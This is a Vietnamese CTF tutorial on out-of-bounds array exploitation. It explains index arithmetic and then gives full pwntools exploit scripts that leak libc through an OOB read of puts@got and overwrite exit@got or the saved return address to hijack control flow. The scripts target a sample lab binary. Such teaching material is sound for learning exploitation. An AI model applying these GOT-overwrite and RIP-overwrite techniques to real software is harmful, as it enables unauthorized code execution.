Out-of-Bounds

Truy cập mảng với chỉ số ngoài biên (âm hoặc quá lớn): arr[idx] với idx attacker chọn → đọc/ghi vào bất kỳ địa chỉ = arr + idx*size. Khác overflow (tuyến tính), OOB cho đọc-ghi có chủ đích tại offset tùy ý — một nguyên thủy cực mạnh. Bài này: số thật, OOB tới GOT.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

OOB: int arr[10]; arr[idx] với idx do attacker chọn mà không kiểm biên → truy cập arr + idx*4 = địa chỉ tùy ý. idx âm → trước mảng; idx lớn → sau mảng.

Đọc (OOB read): leak giá trị tại offset — leak canary, libc (GOT), con trỏ. Ghi (OOB write): ghi giá trị vào GOT/saved RIP/biến → chiếm luồng.

Sức mạnh: khác overflow (chỉ ghi liền kề), OOB nhảy thẳng tới đích. Thường = arbitrary read/write ngay.

Nếu chỉ nhớ một điều: arr[idx] = *(arr + idx*size). Chọn idx để đọc/ghi địa chỉ bạn muốn (GOT, canary...).

⚡ COMBAT CARD — dán chạy khi đang thi
🔎 Nhận dạng 
int idx; scanf("%d",&idx);
arr[idx] = val;        // KHÔNG check 0<=idx<N → OOB write
printf("%d", arr[idx]); // OOB read
📐 Tính index tới đích 
idx = (target - arr_base) / elem_size
# arr tại 0x404060, elem 8 byte, GOT puts tại 0x404018:
# idx = (0x404018 - 0x404060) / 8 = -9   (âm = trước mảng)
💧 OOB read → leak

Đọc arr[idx] với idx trỏ tới GOT → leak libc. Hoặc tới canary slot → leak canary.

🎯 OOB write → control

Ghi arr[idx] = win với idx trỏ GOT entry (vd exit@got) → gọi hàm đó chạy win. Hoặc ghi saved RIP.

⚠️ Nhớ

index âm = trước mảng (dùng số âm/unsigned lớn). elem_size nhân vào (int=4, void*=8). Alignment: đích phải chia hết elem_size (nếu không, lệch — chọn đích khác).

01 / NỀN TẢNG BẮT BUỘC

arr[idx] = số học con trỏ

Trong C, arr[idx] chỉ là cú pháp cho *(arr + idx) — và arr + idx tự nhân idx với kích thước phần tử. Với int arr[] (phần tử 4 byte): arr[idx] = địa chỉ arr + idx*4. Nếu không kiểm 0 ≤ idx < N, attacker chọn idx để con trỏ trỏ ra ngoài mảng — tới GOT, stack, biến global khác. OOB = truy cập ngoài biên.

02 / VÌ SAO CÓ KỸ THUẬT

Mạnh hơn overflow

Buffer overflow ghi tuyến tính (phải lấp hết từ buffer tới đích, đi qua canary). OOB thì nhảy thẳng tới địa chỉ mong muốn qua một con số index — không chạm canary, không cần lấp. Một OOB read+write thường là arbitrary read/write ngay, nguyên thủy mạnh nhất. Vì vậy đề "menu chỉnh sửa phần tử theo index" rất hay giấu OOB: thiếu một dòng if (idx < N) là đủ.

03 / TÍNH ĐỊA CHỈ · MỤC LÕI

index = (đích − base) / elem_size (số thật)

Ví dụ số thật

# long arr[16] tại 0x404060 (elem 8 byte); muốn chạm puts@got = 0x404018
idx = (0x404018 - 0x404060) / 8 = (-0x48) / 8 = -9
# arr[-9] = *(0x404060 + (-9)*8) = *(0x404018) = puts@got
# đọc arr[-9] → leak libc ; ghi arr[-9]=win → đổi puts thành win
AlignmentĐích phải căn elem_size so với base: (đích − base) % elem_size == 0. Nếu không chia hết → index lẻ → lệch byte. Chọn đích căn, hoặc dùng mảng byte (elem 1) để tới mọi địa chỉ.

07 / EXPLOIT ĐẦY ĐỦ

OOB read leak + OOB write GOT (số thật)

// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie (Partial RELRO)
long arr[16];   // global tại 0x404060
// menu: 1-show arr[i]  2-set arr[i]=v   (KHÔNG check biên)
# BẢN A — OOB read leak libc, OOB write exit@got = win (hoặc system).
from pwn import *
exe  = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)

ARR  = 0x404060; ELEM = 8
def idx_of(addr): return (addr - ARR)//ELEM    # index tới addr
def show(i): p.sendlineafter(b">",b"1"); p.sendline(str(i).encode()); return int(p.recvline())
def setv(i,v): p.sendlineafter(b">",b"2"); p.sendline(str(i).encode()); p.sendline(str(v).encode())

# 1) leak libc: OOB read puts@got (idx = -9)
leak = show(idx_of(exe.got.puts))         # arr[-9] = puts thật
libc.address = leak - libc.sym.puts
log.success(f"libc = {hex(libc.address)}")

# 2) OOB write: exit@got = system (khi exit → system(?) ... hoặc = one_gadget)
setv(idx_of(exe.got.exit), libc.sym.system)
# hoặc ghi = one_gadget: setv(idx_of(exe.got.puts), libc.address+0xe3b01)
p.sendlineafter(b">", b"3")              # trigger exit → gọi hàm đã ghi
p.interactive()
Thành thậtARR=0x404060, exit@got trigger là của binary mẫu. idx tính bằng (addr−ARR)//ELEM. Ghi one_gadget vào GOT hàm sắp gọi tiện hơn system (khỏi set rdi). Full RELRO → không ghi GOT; nhắm stack/hook.
# BẢN B — OOB write thẳng saved RIP (nếu mảng trên stack).
from pwn import *
exe = ELF("./vuln", checksec=False); p = process(exe.path)
# mảng cục bộ trên stack: idx dương vượt mảng tới saved RIP
# idx_rip = (saved_rip_addr - arr_stack_addr)//8  (đo bằng gdb)
setv(idx_rip, exe.sym.win)                # ghi saved RIP = win
# khi hàm return → win() (không cần leak nếu no-PIE)
p.interactive()
Mảng stackNếu mảng là biến cục bộ (trên stack), index dương tới saved RIP → OOB write = ret2win trực tiếp, KHỎI qua canary (nhảy thẳng). Rất gọn.
# BẢN C — pwnld.
from pwnld import *
exe = ELF("./vuln",checksec=False); libc=get_libc("./libc.so.6"); p=start()
ARR=0x404060; idx=lambda a:(a-ARR)//8
# ... show/setv như A ...
rebase_libc(leak=show(idx(exe.got.puts)), sym="puts")
setv(idx(exe.got.exit), LIBC.sym.system)
sla(b">",b"3"); ia()
pwnldrebase_libc trừ offset. Phần tính idx là kiến thức bài này.
